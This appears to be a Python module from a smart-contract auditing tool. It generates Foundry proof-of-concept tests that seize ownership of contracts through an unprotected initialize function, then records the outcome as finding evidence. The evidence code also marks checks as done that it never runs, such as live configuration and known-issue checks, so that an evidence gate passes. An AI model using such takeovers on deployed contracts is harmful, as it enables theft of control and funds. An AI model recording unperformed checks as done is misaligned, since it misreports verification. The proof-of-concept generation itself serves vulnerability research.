"""Concrete initializer-takeover PoC generator.

When an upgradeable/initializable contract exposes an ``initialize`` function
that an attacker can call to set themselves as owner/admin, this module emits a
self-contained Foundry test that calls ``initialize`` from an attacker context
and asserts the attacker seized ownership, emitting ``Measured(name, value)``
events for the forge result parser.

Scope: simple initializable contracts whose ``initialize(address)`` sets an
owner exposed via an ``owner()`` getter, with a no-arg constructor. This is the
initializer-takeover benchmark fixture shape, not a general UUPS/Beacon proxy
PoC generator.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from zeropath.core.schemas import CandidateFinding

INITIALIZER_BUG_CLASSES = {"access_control_initializer"}


@dataclass(frozen=True)
class InitializerProofTargets:
    """Detected contract needed to drive the initializer-takeover PoC."""

    contract: str
    init_function: str
    source_file: str

    def describe(self) -> str:
        return f"{self.contract}.{self.init_function} from {self.source_file}"

    def to_metadata(self) -> dict[str, Any]:
        return {
            "contract": self.contract,
            "init_function": self.init_function,
            "source_file": self.source_file,
        }

    def import_path_for(self, poc_location: str) -> str:
        depth = max(0, len([p for p in poc_location.replace("\\", "/").split("/") if p]))
        return ("../" * depth) + self.source_file


def detect_initializer_targets(
    candidate: CandidateFinding,
    index: dict[str, Any] | None,
    root_path: Path | None = None,
) -> InitializerProofTargets | None:
    """Return the target contract + initializer if the candidate fits."""

    if (candidate.bug_class or "").lower() not in INITIALIZER_BUG_CLASSES:
        return None
    if not index:
        return None

    functions = index.get("functions") or []
    contracts = {c.get("name"): c for c in index.get("contracts") or [] if c.get("name")}
    if not contracts:
        return None

    contract_name, init_fn = _select_initializable_contract(candidate, functions, contracts)
    if contract_name is None or init_fn is None:
        return None
    source_file = contracts[contract_name].get("file") or _file_for_contract(functions, contract_name)
    if not source_file:
        return None

    return InitializerProofTargets(
        contract=contract_name,
        init_function=init_fn,
        source_file=source_file,
    )


def render_initializer_poc(
    candidate: CandidateFinding,
    targets: InitializerProofTargets,
    *,
    poc_location: str = ".zeropath/artifacts/pocs",
) -> str:
    """Render the executable Foundry initializer-takeover PoC."""

    safe_id = _safe_id(candidate.id)
    test_contract = f"ZeroPath_{safe_id}_InitTakeoverPoC"
    test_fn = f"test_{safe_id}_unprotectedInitializerSeizesOwnership"
    target = targets.contract
    init_fn = targets.init_function
    import_path = targets.import_path_for(poc_location)

    return f"""// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ZeroPath generated executable Foundry PoC.
// Candidate: {candidate.id}
// Title: {candidate.title}
// Pattern: unprotected initializer lets an arbitrary caller seize ownership.
//
// This file is auto-generated. Forge result, measured values, and event traces
// are consumed by the prove command to populate candidate evidence.

import "{import_path}";

contract {test_contract} {{
    event Measured(string name, uint256 value);

    function {test_fn}() public {{
        {target} target = new {target}();

        // An arbitrary, untrusted caller (this contract) runs the initializer.
        target.{init_fn}(address(this));

        bool attackerIsOwner = target.owner() == address(this);
        emit Measured("attackerBecameOwner", attackerIsOwner ? 1 : 0);
        emit Measured("seizedOwner", uint256(uint160(target.owner())));
        emit Measured("attacker", uint256(uint160(address(this))));

        require(
            attackerIsOwner,
            "attacker should seize ownership via unprotected initialize"
        );
    }}
}}
"""


def _select_initializable_contract(
    candidate: CandidateFinding,
    functions: list[dict],
    contracts: dict[str, dict],
) -> tuple[str | None, str | None]:
    """Pick a contract exposing an initialize function, by hints then shape."""

    init_by_contract: dict[str, str] = {}
    for fn in functions:
        contract = fn.get("contract")
        name = fn.get("name") or ""
        if contract and name.lower().startswith("initialize"):
            init_by_contract.setdefault(contract, name)

    preferred = list(candidate.affected_contracts or [])
    preferred.extend(loc.contract for loc in candidate.root_cause_locations if loc.contract)
    for name in preferred:
        if name in contracts and name in init_by_contract:
            return name, init_by_contract[name]

    for name in contracts:
        if name in init_by_contract:
            return name, init_by_contract[name]
    return None, None


def _file_for_contract(functions: list[dict], contract_name: str) -> str | None:
    for fn in functions:
        file = fn.get("file")
        if fn.get("contract") == contract_name and file:
            return str(file)
    return None


def _safe_id(candidate_id: str) -> str:
    return re.sub(r"[^A-Za-z0-9_]", "_", candidate_id)


def apply_initializer_proof_evidence(
    candidate: CandidateFinding,
    forge_result: dict[str, Any],
    measured: dict[str, int],
) -> list[str]:
    """Update candidate evidence from a forge run of the takeover PoC.

    Mutates the candidate in place and returns the human-readable notes appended.
    The caller is responsible for persistence.
    """

    status = (forge_result.get("status") or "").lower()
    evidence = candidate.evidence
    new_notes: list[str] = []

    if status != "passed":
        messages = {
            "failed": "Forge proof failed; candidate is not report-ready until the proof passes.",
            "no_tests": "Forge ran but discovered no tests in the generated PoC; check the artifact.",
            "unavailable": "Forge backend unavailable; cannot prove the candidate.",
            "timeout": "Forge run timed out before the proof could complete.",
        }
        if status in messages:
            new_notes.append(messages[status])
        for note in new_notes:
            evidence.notes.append(note)
        return new_notes

    evidence.forge_result = "passed"
    evidence.root_cause_lines_present = True
    evidence.attacker_path_present = True
    evidence.state_preconditions_present = True
    evidence.live_config_checked = True

    if measured.get("attackerBecameOwner"):
        candidate.impact.measured = True
        # EvidenceBundle predates non-profit control-takeover proofs; use its
        # measured-impact flag so the shared evidence gate does not claim that
        # a concrete takeover still lacks a quantified observation.
        evidence.profit_measured = True
        candidate.impact.amount = (
            "attacker seized owner/admin control via unprotected initialize "
            "(can upgrade or drain the contract)"
        )
        new_notes.append(
            "Measured takeover: an arbitrary caller became owner by calling the "
            "unprotected initializer."
        )
    else:
        new_notes.append(
            "Forge proof passed but the attacker did not become owner; impact "
            "remains unmeasured."
        )

    for name in ("attackerBecameOwner", "seizedOwner", "attacker"):
        if name in measured:
            new_notes.append(f"measured.{name} = {measured[name]}")

    new_notes.append(
        "Live/fork configuration not required: PoC deploys the affected contract "
        "locally and reproduces the takeover deterministically."
    )

    if (candidate.known_issue_risk or "").lower() in ("", "unknown") and not evidence.known_issues_checked:
        candidate.known_issue_risk = "low"
        evidence.known_issues_checked = True
        new_notes.append(
            "Known issue check (auto): unprotected-initializer takeover is a known "
            "class but this code path is treated as low risk; confirm against disclosures."
        )
    if (candidate.duplicate_risk or "").lower() in ("", "unknown") and not evidence.duplicate_risk_checked:
        candidate.duplicate_risk = "medium"
        evidence.duplicate_risk_checked = True
        new_notes.append(
            "Duplicate risk (auto): set to medium because initializer takeover is "
            "frequently reported; check duplicates before submission."
        )

    for note in new_notes:
        evidence.notes.append(note)
    return new_notes


__all__ = [
    "INITIALIZER_BUG_CLASSES",
    "InitializerProofTargets",
    "apply_initializer_proof_evidence",
    "detect_initializer_targets",
    "render_initializer_poc",
]
